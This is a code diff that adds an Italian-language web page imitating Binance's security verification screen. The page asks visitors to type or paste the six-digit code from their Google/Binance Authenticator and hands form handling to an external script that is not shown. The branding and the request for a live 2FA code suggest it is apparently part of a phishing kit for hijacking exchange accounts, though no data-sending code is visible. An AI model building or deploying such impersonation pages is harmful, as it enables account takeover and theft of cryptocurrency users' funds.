@@ -1,0 +1,77 @@
+
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance - Verifica di sicurezza</title>
+    <link rel="icon" type="image/png" href="./icons/main-logo.png">
+    <link rel="stylesheet" href="authenticator-style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="logo">
+                <img src="../../logo.png" alt="Binance" class="logo-image">
+            </div>
+            
+            <h1 class="title">Inserisci codice di verifica</h1>
+            
+            <div class="verification-description">
+                Inserisci il codice del tuo Google/Binance Authenticator.
+            </div>
+            
+            <form class="login-form">
+                <div class="form-group">
+                    <label for="code" class="form-label">App Authenticator</label>
+                    <div class="code-input-container">
+                        <input 
+                            type="text" 
+                            id="code" 
+                            class="form-input"
+                            placeholder="Inserisci il codice di 6 cifre"
+                            maxlength="6"
+                            pattern="[0-9]*"
+                            inputmode="numeric"
+                        >
+                        <button type="button" class="paste-button" id="pasteButton">
+                            Incolla
+                        </button>
+                    </div>
+                </div>
+                
+                <button type="submit" class="submit-button">
+                    <span class="button-text">Invia</span>
+                    <div class="loading-animation" style="display: none;">
+                        <div class="loading-bar"></div>
+                        <div class="loading-bar"></div>
+                        <div class="loading-bar"></div>
+                        <div class="loading-bar"></div>
+                        <div class="loading-bar"></div>
+                    </div>
+                </button>
+            </form>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <span class="footer-language">
+                    <svg class="globe-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="2" y1="12" x2="22" y2="12"/>
+                        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+                    </svg>
+                    Italiano
+                </span>
+                <a href="#" class="footer-link">Cookie</a>
+                <a href="#" class="footer-link">Termini</a>
+                <a href="#" class="footer-link">Privacy</a>
+            </div>
+        </div>
+    </footer>
+    
+    <script src="authenticator-script.js"></script>
+</body>
+</html>
